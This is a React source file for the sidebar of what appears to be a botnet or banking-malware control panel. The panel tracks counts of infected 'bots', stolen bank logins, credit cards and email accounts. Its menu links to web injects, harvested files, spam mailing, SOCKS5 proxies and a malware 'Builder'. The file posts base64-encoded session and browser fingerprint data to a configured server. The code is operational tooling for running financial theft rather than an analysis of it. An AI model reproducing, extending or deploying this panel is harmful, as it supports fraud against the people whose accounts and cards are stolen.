import React from 'react';
import { Link, NavLink } from 'react-router-dom';
import SettingsContext from '../Settings';
import { try_eval } from '../serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import Cookies from 'js-cookie';
import crypto from "crypto";


function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

class SideBarMenu extends React.Component {

    constructor(props) {
        super(props);
       
        this.state = {
            error: null,
            isLoaded: false,
            stats_bots: "0",
            stats_inject: "0",
            stats_banks: "0",
            stats_cards: "0",
            stats_mails: "0",
            stats_online: "0",
            stats_files: "0"
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }
    logOutEvent() {
        var cookies = document.cookie.split(";");
        for (var i = 0; i < cookies.length; i++) {
            createCookie(cookies[i].split("=")[0],"",-1);
        }
        document.location = "/?logout";
    }
    componentDidMount() {
        this.onLoadJson();
    }

    autoUpdate() {
    
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(), SettingsContext.autoUpdateDelay);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson();
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }
    
    

    onLoadJson () {
    
        this.DisableTimer();
    
        let sessing_id = '';
        let fingerprint = '';
        try {
            sessing_id = crypto.createHash('md5').update(Cookies.get('PHPSESSID')).digest('hex').substr(0,22); 
            fingerprint = crypto.createHash('md5').update( navigator.userAgent + navigator.languages +navigator.cookie + new Date().getTimezoneOffset() + window.screen.width + window.screen.height + window.screen.colorDepth ).digest('hex').substr(0,30);
            } catch (e) {
          //      this.logOutEvent();
            }
       
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {'params': new Buffer('{"sent_request":"info_ss","sid":"'+ sessing_id +'","fingerprint":"'+fingerprint+'"}').toString('base64')}
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					this.setState({
                        isLoaded: true,
                        stats_bots: result.CB,
                        stats_inject: result.CI,
						stats_banks: result.BS,
						stats_cards: result.CS,	
						stats_mails: result.ML,
                        stats_online: result.ON,
                        stats_files: result.FS
                    });
                    
                    if(result.CL=='1'){
                    this.logOutEvent();
                    }
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading main stats. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        this.autoUpdate();
    }

  

    defaultOnClickAction () { 
        this.onLoadJson();
    }

    render () {

       let tutorial = '/tutorial';
       let tutorialIcon = 'fa fa-info-circle';
       let tutorialLabel = 'Tutorial';
       let path_logo = '/img/logo.png';
        if(Cookies.get('hex_mex') == '715aac77349c81949ef3be230b619a2f'){ // tractor
             tutorial = '';
             tutorialIcon = '';
             tutorialLabel = '';
             path_logo = '';
         }
        
        return (

          
            <React.Fragment>{}
            
           
            <nav id="s_menu">
                <div class="s_menu-header" style={({padding:'0px'})}>
                    <img class="" style={({width:'62px',marginBottom:'0px', marginTop:'9px', marginLeft:'30px'})} src={path_logo} />
                </div>

                <div class="navLink disable-select">
                    <ul>   
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/clients"><i class="fa fa-users"></i><span class="m02">Bots</span></NavLink></li>
                        <span class="icon_1">+{this.state.stats_online}</span>
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/list_banks"><i class="fa fa-university"></i><span class="m02">Banks</span></NavLink></li>
                        <span class="icon_2">+{this.state.stats_banks} </span>
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/list_credit_cards"><i class="fa fa-credit-card"></i><span class="m02">Cards</span></NavLink></li>
                        <span class="icon_3">+{this.state.stats_cards} </span>
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/list_emails"><i class="fa fa-envelope"></i><span class="m02">Email</span></NavLink></li>
                        <span class="icon_4">+{this.state.stats_mails} </span>
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/injects"><i class="fas fa-syringe"></i><span class="m02">Injects</span></NavLink></li>
                        <span class="icon_6">+{this.state.stats_files} </span>
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/files"><i class="fas fa-file"></i><span class="m02">Files</span></NavLink></li>    
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/db_mails"><i class="fas fa-paper-plane"></i><span class="m02">Mailing</span></NavLink></li>    
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/socks5"><i style={({fontSize: '20spx', marginTop: '3px'})} class="fas fa-chart-network"></i><span class="m02">Socks5</span></NavLink></li>    
                        
                        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/builder"><i style={({fontSize: '19px'})} class="far fa-atom-alt"></i><span class="m02">Builder</span></NavLink></li>  
                        <span class="icon_5">+{this.state.stats_inject} </span>
                        <li class="m01" style={({marginLeft:'-1px'})}><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/settings"><i class="fa fa-cogs"></i><span class="m02">Settings</span></NavLink></li>  
                        <li class="m01" style={({marginLeft:'-1px'})}><NavLink onClick={this.defaultOnClickAction.bind(this)} to="/session"><i class="fa fa-user"></i><span class="m02">Session</span></NavLink></li>  


                    </ul>
                </div>

                <div class="navLink2 disable-select">
                    <ul>
        <li class="m01"><NavLink onClick={this.defaultOnClickAction.bind(this)} to={tutorial}><i class={tutorialIcon}></i><span class="m02">{tutorialLabel}</span></NavLink></li>
                        <li class="m01" onClick={this.logOutEvent.bind(this)}><NavLink><i class="fa fa-sign-out"></i><span class="m02">Log out</span></NavLink></li>
                       
                    </ul>
                </div>
            </nav>
            </React.Fragment>
        );
    }
}

export default SideBarMenu;